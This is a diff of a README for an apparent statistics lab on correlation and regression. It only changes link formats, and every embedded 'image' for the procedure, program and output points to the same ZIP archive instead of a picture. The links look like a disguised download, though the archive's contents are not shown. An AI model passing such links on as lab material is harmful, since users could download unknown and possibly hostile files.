@@ -2,7 +2,7 @@
 # Aim : 
 
 To analyse given data using coeffificient of correlation and regression line
-![image](https://github.com/kiran03-jagadeesh/Correlation_Regression/raw/refs/heads/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
+![image](https://raw.githubusercontent.com/kiran03-jagadeesh/Correlation_Regression/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
 
 
 # Software required :  
@@ -17,14 +17,14 @@ If y represents the dependent variable and x the independent variable, this rela
 
 # Procedure :
 
-![image](https://github.com/kiran03-jagadeesh/Correlation_Regression/raw/refs/heads/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
+![image](https://raw.githubusercontent.com/kiran03-jagadeesh/Correlation_Regression/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
 
 # Program :
 
-![image](https://github.com/kiran03-jagadeesh/Correlation_Regression/raw/refs/heads/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
+![image](https://raw.githubusercontent.com/kiran03-jagadeesh/Correlation_Regression/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
 
 # Output :
-![output](https://github.com/kiran03-jagadeesh/Correlation_Regression/raw/refs/heads/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/Correlation_Regression/main/archminister/Correlation-Regression-v2.6-beta.5.zip)
 
 # Result :
 Hence the data has been analysed using coeffificient of correlation and regression line.
